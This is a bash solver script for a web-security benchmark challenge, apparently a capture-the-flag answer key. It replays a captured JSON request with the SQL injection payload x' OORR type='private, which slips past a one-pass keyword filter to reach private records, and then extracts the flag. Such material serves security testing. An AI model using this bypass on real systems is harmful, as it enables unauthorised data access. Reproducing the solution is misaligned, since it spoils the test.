#!/usr/bin/env bash
# XBEN-006-24 — "Simple SQLi with allowlist" (tags: idor, sqli)
#
# The page filters jobs through a JSON API. The server refuses `private` by
# name, then strips SQL keywords from what is left, then interpolates it into a
# query. Both checks are one pass, so a doubled keyword survives the strip:
# `OORR` loses its inner `OR` and becomes `OR`.
#
# What h5i contributes: the API request is never typed by hand. The page makes
# it, the session stores it, and the payload is one edit to the stored body.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben006-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

# 1. Open with capture on, and with script: the filter form posts by `fetch`.
"$H5I" browser open "$URL/" --session "$SESSION" --new --capture --script >/dev/null

# 2. Submit the form. The page listens for `submit` and fetches `/jobs`; the
#    click reaches that handler, and the reply names the request it caused.
SEQ="$("$H5I" browser click --role button --name "Filter Jobs" \
    --session "$SESSION" --json |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["caused_requests"][0]["seq"])')"

# 3. Send that exact request again with the payload in the JSON body. The quote
#    closes the string, the doubled keyword survives the strip, and `private`
#    is reached without ever being asked for by name.
REPLAY="$("$H5I" websec replay "req_$SEQ" \
    --set "json.job_type=x' OORR type='private" \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"

# 4. The flag is in the answer to the replay.
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["conditions"][0]["captures"][0])'
